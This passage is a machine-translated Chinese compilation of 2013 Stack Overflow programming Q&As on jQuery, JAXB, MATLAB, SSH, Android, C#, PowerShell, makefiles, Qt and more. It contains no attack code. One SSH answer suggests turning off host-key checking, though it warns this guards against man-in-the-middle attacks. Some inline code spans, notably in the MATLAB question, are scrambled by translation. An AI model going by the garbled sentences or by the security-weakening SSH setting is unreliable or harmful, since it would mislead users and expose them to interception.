function preloadImages (paths, callback) {

    var deferreds = [];

    $.each(paths, function (i, src) {
        var deferred = $.Deferred(),
            img = new Image();

        deferreds.push(deferred);
        img.onload = deferred.resolve;
        img.src = src;
    });

    $.when.apply($, deferreds).then(callback);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:18:36.760

你可以使用负载处理程序吗？ [http://api.jquery.com/load-event/](http://api.jquery.com/load-event/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T23:32:52.733

您可以预加载多个图像并为每个图像分配相同或不同的回调，如下所示：

```
preloadImages([
    {src:"image1.jpg", callback:someFunction1},
    {src:"image2.jpg", callback:someFunction2},
    {src:"image3.jpg", callback:someFunction3}
]);

function preloadImages(arr)
{   
    function _preload(imgObj)
    {
        var img = new Image();
        img.src = imgObj.src;
        img.onload = imgObj.callback;
    }

    for (var i = 0; i < arr.length; i++)
    {
        _preload(arr[i]);
    }
} 
```

# jaxb2 - 缺少 ObjectFactory 中生成的类的创建方法

> ID：14348719
> 
> 赞同：2
> 
> 时间：2013-01-15T23:16:31.500
> 
> 标签：jaxb2, maven-jaxb2-plugin

我们使用 jaxb2-plugin 生成一些类，并且在创建 JaxbContext 时依赖于对象工厂。

```
 <plugin>
            <groupId>org.jvnet.jaxb2.maven2</groupId>
            <artifactId>maven-jaxb2-plugin</artifactId>
            <executions>
                <execution>
                    <id>Messaging</id>
                    <goals>
                        <goal>generate</goal>
                    </goals>
                    <configuration>
                        <packageName>com.abc.message</packageName>
                        <schemaIncludes>
                            <schemaInclude>abc/api/message/main.xsd</schemaInclude>
                        </schemaIncludes>
                        <bindingIncludes>
                            <bindingInclude>abc/api/message/binding.xjb</bindingInclude>
                        </bindingIncludes>
                        <schemaDirectory>${basedir}/src/main/resources/xsd</schemaDirectory>
                        <bindingDirectory>${basedir}/src/main/resources/xsd</bindingDirectory>
                        <generateDirectory>jaxb2-generated-sources/messaging</generateDirectory>
                        <removeOldOutput>true</removeOldOutput>
                        <extension>true</extension>
                        <verbose>false</verbose>
                        <args>
                            <arg>-target</arg>
                            <arg>2.2</arg>
                            <arg>-Xequals</arg>
                            <!--arg>-XhashCode</arg-->
                            <arg>-Xlocator</arg>
                            <arg>-Xinheritance</arg>
                            <arg>-Xcopyable</arg>
                        </args>
                        <plugins>
                            <plugin>
                                 <groupId>org.jvnet.jaxb2_commons</groupId>
                                 <artifactId>jaxb2-basics</artifactId>
                                 <version>0.6.0</version>
                            </plugin>
                        </plugins>
                    </configuration>
                </execution>
            </executions>
        </plugin> 
```

在 main.xsd 我有包含架构 - 如下所示：

```
<xsd:schema .... >
    <xsd:include schemaLocation="includeMe.xsd"/>
    <xsd:element name="Job">
        .....
    </xsd:element>
</xsd:schema> 
```

includeMe.xsd 的内容：

```
 <xsd:schema .... >
    <xsd:element name="JobDef">
        .....
    </xsd:element>
</xsd:schema> 
```

问题：即使 JAXB 正确生成了所有类（Job 和 JobDef），ObjectFactory 仍然只包含 main.xsd 中定义的创建方法。

问题：如何正确生成 ObjectFactory 以便所有生成的类的创建方法都在那里？

任何指针？

卡勒菲尔

# matlab - 计算互补投影时的数值问题

> ID：14348722
> 
> 赞同：1
> 
> 时间：2013-01-15T23:16:36.947
> 
> 标签：matlab

我正在使用 matlab 来计算以下问题：

`A`，是`B`两个正交矩阵，其中是单位矩阵。并且比 大得多。我正在计算，这也是一个正交矩阵。`m``n``A'*A = I``B'*B = I``I``m``n``C = (2B*B'-I)*A`

但是在matlab中，数字的精度会导致以下问题：

```
max(max(abs(A'*A-I))) = e0 > 0
max(max(abs(B'*B-I))) = e0 > 0 
```

并且计算的`C`有`max(max(abs(C'*C-I))) = e1 > e0`。

如果我通过计算重复上述过程`D = (2C*C'-I)*B`，这个错误界限会上升`D`，随着越来越多的这种迭代，这个错误就会爆炸。

有没有办法在不增加这个误差范围的情况下进行计算？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T01:23:41.687

作为一般规则，您执行的计算和转换越多，您就越需要开始担心浮点错误。

为了减轻影响，有两种可能性：

1) 使用像 Maple 或 Mathematica 这样支持精确算术的软件，这将主要以更大的计算负担为代价来消除问题。我的理解是Matlab不支持精确的算术（但我可能错了......）

2) 使用比 Double 更高的精度来减轻浮点错误。例如，FEX 提交的[Multiple Precision Toolbox for MATLAB](http://www.mathworks.com/matlabcentral/fileexchange/6446)声称支持任意大精度格式。不过，我自己从未使用过它，所以我无法评论它的效果如何。

3) 根据矩阵中数字的相对大小，您可能可以利用一些数值技巧或转换来减少浮点错误。这是一个很大的话题，但总的来说，这个想法是尝试扩展您的问题，以使数字在数量级上尽可能接近。

可能还有其他一些我不知道的可能性。我当然不是这方面的专家。我很想看看其他受访者的建议。

哦，另一件事，我偶然发现了一个密切[相关的 SO question](https://stackoverflow.com/questions/6359116/is-it-possible-to-remove-floating-point-errors-without-resorting-to-arbitrary-pr)。

# ssh - SSH 不断抱怨标识更改（永久解决方案？）

> ID：14348726
> 
> 赞同：0
> 
> 时间：2013-01-15T23:16:56.350
> 
> 标签：ssh, ssh-keys

我需要 ssh 进入同一台机器上的各种操作系统。我面临的一个问题是，每当我这样做时，ssh 都会抱怨

```
 WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! 
```

我有一个临时工作解决这个问题，即删除

```
/Users/XYZ/.ssh/known_hosts 
```

但是我必须日复一日地这样做，所以每次都删除它很烦人。有没有永久解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T02:14:28.023

主机密钥检查对于检测“中间人”攻击非常重要，因此不建议禁用它，但您可以使用以下选项跳过该检查，

```
ssh -o "StrictHostKeyChecking=no" user@hostname 
```

# android - Android eclipse nullpointexceptionerror 在运行时

> ID：14348728
> 
> 赞同：2
> 
> 时间：2013-01-15T23:17:12.077
> 
> 标签：android, eclipse

我在运行时不断收到 Nullpointexceptionerror。根据 logcat，错误是由第 43 行引起的，即：

```
Database databaseNieuw = new Database(new File(naamDatabase), Version.DBASE_4); 
```

该行中唯一可能引发此类错误的是 naamDatabase，它是从 EditText 字段获取的字符串。它们都在第 43 行以上定义。

任何帮助将不胜感激。

日志猫：

```
01-15 23:44:40.292: E/Trace(20437): error opening trace file: No such file or directory     (2)
01-15 23:44:46.769: E/AndroidRuntime(20437): FATAL EXCEPTION: main
01-15 23:44:46.769: E/AndroidRuntime(20437): java.lang.NullPointerException
01-15 23:44:46.769: E/AndroidRuntime(20437):    at nl.knaw.dans.common.dbflib.Database.<init>(Database.java:112)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at nl.knaw.dans.common.dbflib.Database.<init>(Database.java:64)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at com.example.bosbouwapp.screen1$2.onClick(screen1.java:43)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at android.view.View.performClick(View.java:4102)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at android.view.View$PerformClick.run(View.java:17085)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at android.os.Handler.handleCallback(Handler.java:615)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at android.os.Handler.dispatchMessage(Handler.java:92)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at android.os.Looper.loop(Looper.java:155)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at android.app.ActivityThread.main(ActivityThread.java:5454)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at java.lang.reflect.Method.invokeNative(Native Method)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at java.lang.reflect.Method.invoke(Method.java:511)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1029)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:796)
01-15 23:44:46.769: E/AndroidRuntime(20437):    at dalvik.system.NativeStart.main(Native Method) 
```

代码：

```
package com.example.bosbouwapp;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import nl.knaw.dans.common.dbflib.Database;
import nl.knaw.dans.common.dbflib.Field;
import nl.knaw.dans.common.dbflib.InvalidFieldLengthException;
import nl.knaw.dans.common.dbflib.InvalidFieldTypeException;
import nl.knaw.dans.common.dbflib.Type;
import nl.knaw.dans.common.dbflib.Version;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class screen1 extends Activity {

    /** Called when the activity is first created. */
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_screen1);

    Button terug = (Button) findViewById(R.id.button2);    
    terug.setOnClickListener(new View.OnClickListener() {
        public void onClick(View view) {
            Intent myIntent = new Intent(view.getContext(), home.class);
            startActivityForResult(myIntent, 0);
        }

    });

    Button next = (Button) findViewById(R.id.button3);
     next.setOnClickListener(new View.OnClickListener() {
         public void onClick(View view) {

                EditText databaseNaam = (EditText)    findViewById(R.id.database_naam);
                String naamDatabase = databaseNaam.getText().toString();
                Database databaseNieuw = new Database(new File(naamDatabase), Version.DBASE_4);            
                Global g = (Global) getApplication();
                List<Field> fields = new ArrayList<Field>();
                List<Field> fields2 = new ArrayList<Field>();

      if (naamDatabase.trim().equals("")) {
        Toast.makeText(getApplication(), "Veld is leeg", Toast.LENGTH_SHORT).show();
      }  
      else{

    fields.add(new Field("Stapel", Type.NUMBER, 3));
    fields.add(new Field("Boomsoort", Type.CHARACTER, 25));
    fields.add(new Field("Diameter", Type.NUMBER, 4));
    fields.add(new Field("Lengte", Type.NUMBER, 2));
    fields.add(new Field("Overig", Type.CHARACTER, 150));
    try {
        databaseNieuw.addTable("Boomstam", fields);
    } catch (InvalidFieldTypeException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();
    } catch (InvalidFieldLengthException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();
    }

    fields2.add(new Field("Stapel", Type.CHARACTER, 50));
    fields2.add(new Field("Datum", Type.DATE));
    fields2.add(new Field("X", Type.NUMBER, 20));
    fields2.add(new Field("Y", Type.NUMBER, 20));
    fields2.add(new Field("Houtsoort", Type.CHARACTER, 50));

    try {
        databaseNieuw.addTable("Houtstapel", fields2);
    } catch (InvalidFieldTypeException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (InvalidFieldLengthException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    g.setDatabaseNieuw(databaseNieuw);      
    Intent myIntent = new Intent(view.getContext(), screen3.class);
            startActivityForResult(myIntent, 0);

        }

    }

    });
}
} 
```

编辑

我目前正在研究 Database.class。因为我（还）不能真正做出正面或反面，也许其他人可以。

Database.class的代码：

```
// Decompiled by DJ v3.12.12.96 Copyright 2011 Atanas Neshkov  Date: 1/16/2013 12:48:01 AM
// Home Page: http://members.fortunecity.com/neshkov/dj.html  http://www.neshkov.com/dj.html - Check often for new version!
// Decompiler options: packimports(3) 
// Source File Name:   Database.java

package nl.knaw.dans.common.dbflib;

import java.io.File;
import java.nio.charset.Charset;
import java.util.*;

// Referenced classes of package nl.knaw.dans.common.dbflib:
//            Table, Version, InvalidFieldTypeException, InvalidFieldLengthException

public class Database
{

public Database(File databaseDirectory, Version version)
{
    this(databaseDirectory, version, Charset.defaultCharset().name());
}

public Database(File databaseDirectory, Version version, String charsetName)
{
    tableMap = new HashMap();
    if(databaseDirectory == null || databaseDirectory.isFile())
        throw new IllegalArgumentException("Database must be a directory ");
    if(!databaseDirectory.exists())
        databaseDirectory.mkdirs();
    this.databaseDirectory = databaseDirectory;
    this.version = version;
    this.charsetName = charsetName != null ? charsetName : Charset.defaultCharset().name();
    Charset.forName(this.charsetName);
    String fileNames[] = databaseDirectory.list();
    String arr$[] = fileNames;
    int len$ = arr$.length;
    for(int i$ = 0; i$ < len$; i$++)
    {
        String fileName = arr$[i$];
        if(fileName.toLowerCase().endsWith(".dbf") && fileName.length() > ".dbf".length())
            addTable(fileName);
    }

}

public Set getTableNames()
{
    return Collections.unmodifiableSet(tableMap.keySet());
}

public Table getTable(String name)
{
    return (Table)tableMap.get(name);
}

public Table addTable(String name, List fields)
    throws InvalidFieldTypeException, InvalidFieldLengthException
{
    Table table = (Table)tableMap.get(name);
    if(table == null)
    {
        table = new Table(new File(databaseDirectory, name), version, fields);
        tableMap.put(name, table);
    }
    return table;
}

private void addTable(String name)
{
    Table table = (Table)tableMap.get(name);
    if(table == null)
    {
        table = new Table(new File(databaseDirectory, name), charsetName);
        tableMap.put(name, table);
    }
}

public void removeTable(String name)
{
    tableMap.remove(name);
}

public void removeTable(Table table)
{
    tableMap.remove(table.getName());
}

public String getCharsetName()
{
    return charsetName;
}

private final File databaseDirectory;
private final Map tableMap;
private final Version version;
private final String charsetName;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:46:16.493

您能否在代码中设置一个断点并单步执行以查看您是否尝试在任何点对未初始化的对象进行调用，或者是否正在将空对象传递给 Database 类？`naamDatabase`当您在第 43 行传递它时，具体确认它不为空？这个字符串也是您在调用时所期望的吗？

**更新**

正如我在评论中指出的那样，在单步执行以下文件对象的状态时：

```
File file = new File(naamDatabase); 
```

断点在这里 - 检查文件对象不为空

```
Database databaseNieuw = new Database(file, Version.DBASE_4); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:23:37.180

这里的错误在 Database 类中，并且没有看到无法跟踪问题。如果您确定传递给 Database 的所有内容都不为 null，那么应该归咎于 Database 类。

我建议与创建该数据库类的人联系，无论它做什么！

# c# - 泛型类型推断

> ID：14348730
> 
> 赞同：0
> 
> 时间：2013-01-15T23:17:26.650
> 
> 标签：c#, .net, linq, generics

我对泛型很满意，但作为一个喜欢了解每个细节的人，我有这个问题。在我的`Where`LINQ 扩展方法的实现中

```
 public static class Extensions
    {
        public static IEnumerable<T> Where<T>(
                         this IEnumerable<T> source, Func<T, bool> predicate)
        {
            foreach (T element in source)
                if (predicate(element))
                    yield return element;
        }
    } 
```

为什么`T`in是`Where<T>`必要的？为什么不能从`T`in推断类型`IEnumerable<T>`？换句话说，为什么签名不能是

```
public static IEnumerable<T> Where(this IEnumerable<T> source, Func<T, bool> predicate) 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:21:51.150

> `public static IEnumerable<T> Where(this IEnumerable<T> source, Func<T, bool> predicate)`

有了这样的签名，`T`将是一个未声明的标识符。您不能只使用未在任何地方定义的`IEnumerable<T>`if 。`T`因此，您需要`T`方法（或类）级别的通用参数`IEnumerable<T>`才能有意义。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T23:23:53.053

完全没有理由认为`T`in`IEnumerable<T>`和`Where<T>`必须是同一件事。您是说它们必须通过将它们都指定为`T`

`IEnumerable<T>`是该方法返回的内容。`Where<T>`用于定义用作参数的泛型类型。可以想象它们`T`可能是不同的类型，如果您没有将它们都指定为`T`

即：返回类型（`IEnumerable<T>`）不一定与参数的类型（`T`中的`Where<T>`）有关。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T23:34:16.093

您正在混合方法的*定义*`Where<T>`和它的*用法*。

在*定义*（和声明）函数时，您需要那里的类型参数来向编译器显示该方法是通用的。声明类型参数`T`后，您可以使用它来显示输入和输出参数的类型（在本例中为`IEnumerable<T>`）。

使用该*方法*时，您不需要指定它 - 它可以很好地从第一个输入参数中推断出来。如果您不确定，请尝试以下操作：

```
var numbers = new List<int> { 1, 2, 3, 4, 5 };
var odds = numbers.Where(x => x % 2 != 0);

// test for example odds is IEnumerable<int> if you want confirmation =) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T23:21:47.823

参数列表的`<T>`开头有点像“变量声明”——就像你不能只说：

```
x = 10; 
```

您需要先声明该变量：

```
int x = 10; 
```

它只是在这里它是 a 的变量声明`Type`。

现在*使用*，这完全是另一回事 - 编译器将尽最大努力尝试`Type`根据用法和现有签名来推断每个变量中的“值”，但这些签名仍然必须声明。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T23:33:29.340

```
public static class Foo
{
    public static T Bar<T>(T input) { return input; }
} 
```

通常会推断出类型。

```
Foo.Bar("test"); 
```

但是在这种情况下会发生什么？

```
Foo.Bar(null); //error 
```

无法推断类型参数，如果这是在编译时，您会收到编译错误。

```
Foo.Bar<string>(null); //works 
```

# powershell - 同步 PowerShell 后台作业

> ID：14348731
> 
> 赞同：2
> 
> 时间：2013-01-15T23:17:37.443
> 
> 标签：powershell, powershell-remoting, start-job

如果两个后台作业是从同一个会话开始的，其中一个如何确定另一个已经完成？最初我尝试过这样的事情：

```
$j1 = Start-Job {
    Start-Sleep -Seconds 5
    "j1 done"
}

$j2 = Start-Job {
    param($j)
    "j2 waiting..."
    $j | Wait-Job
    "j2 done"
} -ArgumentList $j1.Finished

$j1,$j2 | Receive-Job -Wait 
```

当然它不起作用，因为`$j2`只获取了一个序列化的快照`$j1`（快照中的作业状态永远不会改变）；此外，每个后台作业都有自己的作业存储库，因此`$j`对象在`$j2`.

作业可以通过互斥锁、文件系统（如果在同一台机器上）或数据库等进行同步，但我想知道 powershell 是否为此提供了任何远程处理友好的设施？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:50:22.433

我认为这不会奏效，因为作业对象与它们的 PowerShell 会话/运行空间相关。该`Start-Job`cmdlet 启动一个新的运行空间（通常是一个新进程）。我也不相信 PowerShell 事件会起作用，因为它们也出现（根据文档）是特定于会话的。我会保持简单并使用文件 - 将路径传递给两个作业。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-21T13:06:16.130

试试这个 - 在 PowerShell 3.0 和更新版本中：

```
$j1 = Start-Job {
    Start-Sleep -Seconds 5
    "j1 done"
}

$j2 = Start-Job {
    "j2 waiting..."
    $Using:j1 | Wait-Job
    "j2 done"
}

$j1,$j2 | Receive-Job -Wait 
```

# visual-studio-2010 - 有没有人在 Windows 7 上成功安装了 Nodejs Soap？

> ID：14348732
> 
> 赞同：1
> 
> 时间：2013-01-15T23:17:38.287
> 
> 标签：visual-studio-2010, node.js, soap, winapi

我几乎一整天都在尝试安装[milewise 的 nodejs Soap 客户端](https://github.com/milewise/node-soap)。我只是以管理员身份从 cmd 运行以下命令：

```
cd: c:\Program Files\nodejs
npm install soap 
```

它一直在 node-gyp 重建文件中被扼杀。我收到了几个不同的错误，但目前我收到以下错误：

```
error MSB4019: The imported project "C:\Microsoft.Cpp.Defaul.props" was not found.  
Confirm that the path in the <Import> declaration is correct and that the file exists on disk. 
```

这真让我抓狂。我已经尝试了几次安装[node-gyp 的 Windows 7 依赖项的](https://github.com/TooTallNate/node-gyp)迭代。不幸的是，在成功安装 VS C++ 2010 express 后，MS Windows SDK + .NET Framework 4 将无法安装。

有没有人在 Windows 7 上成功安装了这个或任何其他用于 Nodejs 的 Soap 客户端？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T18:43:35.827

为 Windows SDK 7.1安装[Microsoft Visual C++ 2010 Service Pack 1 编译器更新](http://www.microsoft.com/en-us/download/details.aspx?id=4422)（如[https://github.com/TooTallNate/node-gyp](https://github.com/TooTallNate/node-gyp)所建议）为我修复了`MSB4019`错误。

该更新的自述文件指出推荐的顺序是

1.  视觉工作室 2010
2.  视窗 SDK 7.1
3.  视觉工作室 2010 SP1
4.  适用于 Windows SDK 7.1 的 Visual C++ 2010 SP1 编译器更新

# php - Restler 和 log4php 的自动加载类问题

> ID：14348738
> 
> 赞同：4
> 
> 时间：2013-01-15T23:17:58.737
> 
> 标签：php, api, rest, restler, log4php

在使用 log4php 时，我在使用 Restler 创建 API 时遇到了一些麻烦。这似乎是自动装载机的冲突，但我不确定。作为参考，我将尝试仅显示相关的代码部分，希望对您有所帮助。

在 index.php 我有：

```
require_once("../../config.php");
require_once("../../lib/Luracast/restler.php");
use Luracast\Restler\Restler;
$r = new Restler();
$r->addAPIClass('Messages');
$r->addAuthenticationClass('APIAuth');
$r->handle(); //serve the response 
```

其中 config.php 是我的应用程序的加载和配置。里面是：

```
require_once(SYS_PATH.'/lib/log4php/Logger.php');
Logger::configure(SYS_PATH.'/../resources/log4php.xml');
$syslog = Logger::getLogger('System'); 
```

到目前为止，我正在构建的 Messages API 仅包含：

```
class Messages {
    function get($id) {
        return MessageService::getMessage($id);
    }
} 
```

最后，在 MessageService 内部，我们有：

```
static function getMessage($msgId) {
    global $syslog;
    $syslog->debug("Getting message for id $msgId");
    //extraneous code removed
} 
```

当我这样做并尝试访问 messages/get api 函数的 API 时，我收到以下错误：

```
Fatal error: Class 'LoggerLoggingEvent' not found in /path/to/lib/log4php/Logger.php on line 290 
```

已经查看并查看了[https://github.com/Luracast/Restler/issues/72](https://github.com/Luracast/Restler/issues/72) - 这似乎表明应该没有问题，但我不确定或一定做错了什么。

希望一切都有意义并且很清楚，如果我缺少某些东西，请告诉我。我正在使用 Restler 3.0RC3。

# php - 将网站转换为 Wordpress 时 Javascript 停止工作

> ID：14348740
> 
> 赞同：0
> 
> 时间：2013-01-15T23:18:12.900
> 
> 标签：php, javascript, wordpress, validation

我完成了将[http://www.cobalt-chromium-toxicity.com/](http://www.cobalt-chromium-toxicity.com/)创建为静态 html/css 网站，并尝试将其转换为 Wordpress。我失去了表单上的验证功能以及底部的隐藏/显示视频功能。

在我拥有的[网站](http://www.idiodesignstudio.com/websites/cobalt/)的 Wordpress 版本中

```
<script type="text/javascript" src="
<?php bloginfo('template_directory'); ?>/js/jquery.validate.js">
</script>

<script type="text/javascript" src="
<?php bloginfo('template_directory'); ?>/js/videos.js">
</script> 
```

在上面的 header.php 中

```
<?php wp_head(); ?>

</head> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-13T07:15:40.640

我认为`"echo get_template_directory_uri();"`，而不是`"bloginfo('template_directory');"`会为你工作。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2013-01-15T23:23:16.597

我认为您缺少php 代码中的**回声，例如：**

```
<?php echo bloginfo('template_directory'); ?> 
```

# makefile - 测试 makefile 目标中是否存在文件，如果不存在则退出

> ID：14348741
> 
> 赞同：30
> 
> 时间：2013-01-15T23:18:16.427
> 
> 标签：makefile, gnu

如果文件不存在，有没有办法以错误条件退出？我目前正在做这样的事情：

```
all: foo

foo:
    test -s /opt/local/bin/gsort || echo "GNU sort does not exist! Exiting..." && exit 
```

Running`make`运行`all`目标，该目标运行`foo`.

期望是如果`test -s`条件失败，则`echo/exit`执行语句。

但是，即使`/usr/bin/gsort`存在，我也会得到`echo`语句的结果，但`exit`命令不会运行。这与我希望实现的目标相反。

执行上述操作的正确方法是什么？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2013-07-18T00:57:23.043

我意识到这在这一点上有点老了，但你甚至不需要使用 subshel​​l 来测试 Make 中是否存在文件。

它还取决于您希望/期望它如何运行。

使用通配符函数，如下所示：

```
all: foo
foo:
ifeq (,$(wildcard /opt/local/bin/gsort))
    $(error GNU Sort does not exist!)
endif 
```

是一种很好的方法。请注意，ifeq 子句没有缩进，因为它在目标本身之前被评估。

如果您希望对每个目标都无条件地发生这种情况，您可以将其移到目标之外：

```
ifeq (,$(wildcard /opt/local/bin/gsort))
$(error GNU Sort does not exist!)
endif 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2013-01-15T23:56:04.610

[`exit`](https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html#index-exit)单独返回最后执行的命令的状态。在这种情况下，它返回零，这意味着一切正常。

这是因为`||`和`&&`具有[相同的优先级](https://www.gnu.org/software/bash/manual/html_node/Lists.html)，并且 shell 将命令解释为就好像它是编写的一样

```
( test ... || echo ... ) && exit 
```

如果您想发出失败信号，您必须以非零值退出，例如`exit 1`. 如果你想回显*并*退出，只需按顺序将命令分开`;`

```
all: foo

foo:
    test -s /opt/local/bin/gsort || { echo "GNU sort does not exist! Exiting..."; exit 1; } 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-01-16T14:32:26.160

make 中的每个命令行都在其自己的子 shell 中运行。所以运行`exit`只是退出那个子shell——而不是整个makefile。默认情况下，`make`如果任何子 shell 返回不成功的退出状态，则执行将停止（按照惯例，0 表示成功，因此其他任何内容都将停止执行）。最简单的方法就是使用`test`命令的退出状态：

```
all: foo

foo:
    test -s /opt/local/bin/gsort 
```

打印诊断消息会使事情稍微复杂化，因为类似`echo`的命令将返回退出状态 0，导致`make`认为一切正常。要解决此问题，您需要在它之后运行一个命令，该命令将为子 shell 提供非零退出状态：

```
all: foo

foo:
    test -s /opt/local/bin/gsort || { echo "GNU sort does not exist! Exiting..."; exit 1; } 
```

甚至只是

```
all: foo

foo:
    test -s /opt/local/bin/gsort || { echo "GNU sort does not exist! Exiting..."; false; } 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2016-02-21T11:10:50.340

只需这样做：

```
all: /opt/local/bin/gsort 
```

如果`/opt/local/bin/gsort`缺少，您将收到“没有规则来制作目标`/opt/local/bin/gsort'”错误消息。

但是，如果您还想要一些很好的解释，请执行以下操作：

```
/opt/local/bin/gsort:
    echo "GNU sort does not exist! Exiting..."
    false 
```

在 GNU/Make 中，如果未声明目标`.PHONEY`并且没有任何依赖项，则如果不存在与该目标匹配的文件，则将调用该规则。

上面的代码只会在不存在的时候触发`false`命令，会返回一个非0值，make会失败。`/opt/local/bin/gsort`

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-03-26T02:18:21.563

由于您正在检查`gsort`可执行文件是否存在，因此您可以使用`which`or `type`shell 命令，例如：

```
all: foo
  :

foo:
  which gsort || exit 1
  # or
  type gsort || exit 1 
```

您不需要错误消息，因为它会自动打印：

> /bin/sh：第 0 行：类型`gsort`：：未找到

这是显而易见的。

* * *

或者使用`test`或`[`（参见：`help test`/`help [`语法），例如

```
test -x /opt/local/bin/gsort || { echo Error msg; exit 1; } 
```

它检查给定文件是否存在并且它是可执行的，否则显示消息并退出。括号对于通过对命令进行分组来覆盖运算符的正常优先级（从左到右）很重要（有关详细信息，请参阅`Compound Commands`中的部分`man bash`）。

* * *

另一种方法是使用规则的目标来检查文件是否存在并添加为依赖项`all`，例如

```
all: /opt/local/bin/gsort
  @echo Success.

/opt/local/bin/gsort:
  @echo "GNU sort does not exist! Exiting..."
  exit 1 
```

结果：

```
$ make
GNU sort does not exist! Exiting...
exit 1
make: *** [/opt/local/bin/gsort] Error 1 
```

# multithreading - 谁删除在工作线程中创建的对象？

> ID：14348742
> 
> 赞同：0
> 
> 时间：2013-01-15T23:18:17.843
> 
> 标签：multithreading, qt

在我的代码中，工作线程创建对象A，主线程B类析构函数调用工作线程的析构函数，对象A在工作线程的析构函数中被删除。代码是这样的：

```
WorkerThread::foo() {
Object *p = new Object;
}

WorkerThread::~WorkerThread {
delete p;
wait();
}

B::~B() {
emit signal(); 
//this signal is to ask worker thread to quit, 
//the signal/slot connection is connect(this, SIGNAL), mWorkerThread, SLOT));
delete mWorkerThread;
} 
```

现在的问题是工作线程的其他函数可能仍在使用 *p (object A)。我知道我可以在 WorkerThread 析构函数中添加互斥锁。但有时我收到错误消息，说不应该在没有创建它的线程中删除对象 A。这是否意味着我需要在工作线程中删除 *p ？我如何使它工作？使用另一个信号和插槽？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T00:39:10.080

`run()`如果可能，在线程的函数中创建和销毁对象。

如果对象必须存在于调用线程中（例如 Qt 喜欢小部件存在于主线程上），则在线程对象的构造函数中创建它（或将其传入）并像现在一样在析构函数中删除（假设你的线程完成后将被调用者线程销毁）。

此外，在发出终止信号后，`join()`删除它之前的线程，以确保它干净地完成。

# javascript - Phonegap iOS 中的今天日期

> ID：14348745
> 
> 赞同：0
> 
> 时间：2013-01-15T23:18:24.137
> 
> 标签：javascript, ios, cordova

我正在尝试使用 Date(); 在 iOS 上的 Phonegap 应用程序中获取今天的日期；功能。它在 Web 浏览器中工作得很好并给出了输出，但是在 Phonegap 中编译时它没有给出输出。

```
var today = new Date();
var dd = today.getDate();
var mm = today.getMonth()+1; //January is 0!
var yyyy = today.getFullYear();
if(dd<10){dd='0'+dd} if(mm<10){mm='0'+mm} today = yyyy+mm+dd;
document.write(today); 
```

在浏览器中，它为今天提供了正确的输出，20130115，但在模拟器和硬件测试中，我没有得到任何输出

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-25T11:16:37.000

```
var todayDate = new Date().setHours(0,0,0,0); 
```

此代码将成功地为您提供今天的日期。

您可以使用该代码根据您的规范操作日期格式。

# java - Google drive API - 上传问题 - “错误请求”

> ID：14348747
> 
> 赞同：1
> 
> 时间：2013-01-15T23:18:32.250
> 
> 标签：java, google-app-engine, file-upload, google-drive-api, google-api-java-client

我正在开发 GAE java 应用程序，我需要将 PDF 文件上传到用户的谷歌驱动器，但上传总是失败，我不知道什么可能是错误的，因为我已经检查了几个代码示例。

```
import com.google.api.services.drive.Drive;
import com.google.api.services.drive.model.File;

.
.
.

byte[] pdfContent = <... 52kb PDF file ...>

ByteArrayContent mediaContent = new ByteArrayContent("application/pdf", pdfContent);

  File myPDF = new File();
       myPDF.setTitle("Sample PDF");
       myPDF.setDescription("Sample PDF");

  Drive driveService = new Drive.Builder(HTTP_TRANSPORT, JSON_FACTORY, getStoredCredential()).build();
  Drive.Files.Insert insert = driveService.files().insert(hugePDF, mediaContent);

insert.getMediaHttpUploader().setChunkSize(1024 * 1024);
File file = insert.execute(); 
```

此上传代码总是得到错误：400 OK

```
{
 "error": {
  "errors": [
   {
    "domain": "global",
    "reason": "badRequest",
    "message": "Bad Request"
   }
  ],
  "code": 400,
